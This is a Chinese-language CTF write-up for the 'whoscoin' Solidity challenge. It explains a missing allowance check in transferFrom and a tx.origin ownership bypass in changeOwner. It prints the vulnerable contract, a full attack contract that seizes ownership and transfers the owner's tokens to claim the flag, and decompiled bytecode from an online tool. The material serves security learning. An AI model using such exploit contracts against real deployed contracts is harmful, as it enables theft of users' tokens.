    智能合约题目的基本解法和交互

    这是我的第一次做智能合约的题目，这里用来记录一下这个题目的基本解法，和如何与目标合约进行交互，题目选自安恒杯whoscoin

    题目分析

    pragma solidity ^0.4.18;

contract Whoscoin {

    uint256 private constant _INITIAL_SUPPLY = 15*10**27;
    uint8 public decimals = 18;         
    uint256 public totalSupply;
    address public owner;

    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed;

    event sendFlag(string b64email, string slogan);

    function Whoscoin() public {
        balances[msg.sender] = _INITIAL_SUPPLY;
        totalSupply = _INITIAL_SUPPLY;
        owner = msg.sender;
    }


    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != 0x0);
        require(balances[_from] >= _value);
        require(balances[_to] + _value > balances[_to]);

        uint previousBalances = balances[_from] + balances[_to];
        balances[_from] -= _value;
        balances[_to] += _value;
        allowed[_from][msg.sender] -= _value;
        assert(balances[_from] + balances[_to] == previousBalances);

        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        return true;
    }

    function balanceOf(address _owner) constant public returns (uint256 balance) {
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
          owner = _owner;
        }
    }

    function payforflag(string b64email) public {
        require(balanceOf(msg.sender) >= 10000);
        require(owner == msg.sender);
        sendFlag(b64email, "bravo!");

    }

}

    这里主要的问题是在transferFrom里面，我们看到他并没有对allowed是否满足进行验证，即使不够减，但是我们还是可以减去。

}

    智能合约的交互

    如何与目标合约进行交互是一个比较重要的问题，我们可以首先在攻击sol文件中引入相应的目标合约

    contract Instance{
  uint256 _decimals; // STORAGE[0x0]
  uint256 _totalSupply; // STORAGE[0x1]
  address  _owner; // STORAGE[0x2]
  function transferFrom(address varg0, address varg1, uint256 varg2) public payable returns(bool);
  function balanceOf(address varg0) public payable returns(uint256);
  function payforflag(string _parm) payable public;
  function owner() public view returns(address);
  function changeOwner(address varg0) public;
  function allowance(address varg0, address varg1) view public returns(uint256);
  function approve(address varg0, uint256 varg1) public returns(bool);
  function totalSupply() view public returns(uint256) ;
}

    然后我们在攻击函数的构造函数中指定目标合约的地址

    contract Exploit {
    Instance instance;
    address _addr = 0x151f21084a3808c7e74c9cA6658883A79045b138;

    function Exploit() public {
        instance = Instance(_addr);
    }
}

    这样我们就可以使用instance.XXX(YYY)（XXX为方法名，YYY为参数）这样的方法调用目标合约的函数，从而进行交互

    所以我们构造如下攻击合约

    pragma solidity ^0.4.18;
contract Instance{
  uint256 _decimals; // STORAGE[0x0]
  uint256 _totalSupply; // STORAGE[0x1]
  address  _owner; // STORAGE[0x2]
  function transferFrom(address varg0, address varg1, uint256 varg2) public payable returns(bool);
  function balanceOf(address varg0) public payable returns(uint256);
  function payforflag(string _parm) payable public;
  function owner() public view returns(address);
  function changeOwner(address varg0) public;
  function allowance(address varg0, address varg1) view public returns(uint256);
  function approve(address varg0, uint256 varg1) public returns(bool);
  function totalSupply() view public returns(uint256) ;
}

contract Exploit {
    Instance instance;
    address _addr = 0x151f21084a3808c7e74c9cA6658883A79045b138;

    function Exploit() public {
        instance = Instance(_addr);
    }

    function attack(string email) public payable{
        address bankAddr = instance.owner();
        instance.changeOwner(this);
        instance.transferFrom(bankAddr,this,10000);
        instance.payforflag(email);
    }

}

    合约逆向

    有源码的情况合约的攻击并不包含逆向，当没有源码时，我们便需要对其字节码进行逆向，我们可以使用如下工具：

    • https://ethervm.io/decompile/
    • https://ropsten.etherscan.io/bytecode-decompiler
    • https://contract-library.com/

    根据Sissel的推荐，我们使用https://ethervm.io/decompile/进行合约逆向

    function approve(var arg0, var arg1) returns (var r0) {
    memory[0x00:0x20] = msg.sender;
    memory[0x20:0x40] = 0x04;
    var temp0 = keccak256(memory[0x00:0x40]);
    memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;
    memory[0x20:0x40] = temp0;
    storage[keccak256(memory[0x00:0x40])] = arg1;
    return 0x01;
}
